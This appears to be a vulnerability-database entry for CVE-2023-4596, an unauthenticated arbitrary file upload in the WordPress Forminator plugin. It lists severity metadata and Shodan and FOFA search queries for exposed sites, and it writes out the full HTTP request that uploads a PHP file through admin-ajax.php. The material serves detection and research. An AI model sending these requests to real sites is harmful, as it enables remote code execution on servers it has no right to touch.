---
layout: "post"
cve_id: "CVE-2023-4596"
title: "WordPress Plugin Forminator 1.24.6 - Arbitrary File Upload"
pcap: true
pcap_path: "/pcaps/2023/CVE-2023-4596.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2023/CVE-2023-4596.yaml"
author: "E1A"
severity: "critical"
reference:
  - "https://www.exploit-db.com/exploits/51664"
  - "https://www.wordfence.com/threat-intel/vulnerabilities/id/9cd87da6-1f4c-4a15-8ebb-6e0f8ef72513?source=cve"
  - "https://plugins.trac.wordpress.org/changeset/2954409/forminator/trunk/library/fields/postdata.php"
  - "https://github.com/E1A/CVE-2023-4596"
  - "https://nvd.nist.gov/vuln/detail/CVE-2023-4596"
classification:
  cvss-metrics: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
  cvss-score: 9.8
  cve-id: "CVE-2023-4596"
  cwe-id: "CWE-434"
  epss-score: 0.93072
  epss-percentile: 0.9977
  cpe: "cpe:2.3:a:incsub:forminator:*:*:*:*:*:wordpress:*:*"
metadata:
  verified: True
  max-request: 2
  vendor: "incsub"
  product: "forminator"
  framework: "wordpress"
  shodan-query: "http.html:/wp-content/plugins/forminator"
  fofa-query: "body=/wp-content/plugins/forminator"
  publicwww-query: ['/wp-content/plugins/Forminator', '/wp-content/plugins/forminator']
tags:
  - "cve2023"
  - "cve"
  - "forminator"
  - "wordpress"
  - "wp"
  - "wp-plugin"
  - "fileupload"
  - "intrusive"
  - "rce"
  - "incsub"
  - "vkev"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---


## üîç Vulnerability Description
The Forminator plugin for WordPress is vulnerable to arbitrary file uploads due to file type validation occurring after a file has been uploaded to the server in the upload_post_image() function in versions up to, and including, 1.24.6. This makes it possible for unauthenticated attackers to upload arbitrary files on the affected site's server which may make remote code execution possible.


## üåê HTTP Request
```nohighlight
GET / HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Fedora; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Connection: close
Accept-Encoding: gzip
```

```nohighlight
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:1.9.7.20) Gecko/ Firefox/3.6.8
Connection: close
Content-Length: 1189
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryBLOYSueQAdgN2PRe
Accept-Encoding: gzip

------WebKitFormBoundaryBLOYSueQAdgN2PRe
Content-Disposition: form-data; name="textarea-1"

36h8H5oL8AVy1JyAL2Oj1ruOoxY
------WebKitFormBoundaryBLOYSueQAdgN2PRe
Content-Disposition: form-data; name="phone-1"

793826715
------WebKitFormBoundaryBLOYSueQAdgN2PRe
Content-Disposition: form-data; name="email-1"

test@gmail.com
------WebKitFormBoundaryBLOYSueQAdgN2PRe
Content-Disposition: form-data; name="name-1"

36h8H5oL8AVy1JyAL2Oj1ruOoxY
------WebKitFormBoundaryBLOYSueQAdgN2PRe
Content-Disposition: form-data; name="postdata-1-post-image"; filename="36h8H5oL8AVy1JyAL2Oj1ruOoxY.php"
Content-Type: application/x-php

<?php echo md5("CVE-2023-4596");unlink(__FILE__);?>
------WebKitFormBoundaryBLOYSueQAdgN2PRe
Content-Disposition: form-data; name="forminator_nonce"

Gdf8Tg
------WebKitFormBoundaryBLOYSueQAdgN2PRe
Content-Disposition: form-data; name="form_id"

NW6REA
------WebKitFormBoundaryBLOYSueQAdgN2PRe
Content-Disposition: form-data; name="current_url"

http://www.victim.com
------WebKitFormBoundaryBLOYSueQAdgN2PRe
Content-Disposition: form-data; name="action"

forminator_submit_form_custom-forms
------WebKitFormBoundaryBLOYSueQAdgN2PRe
```


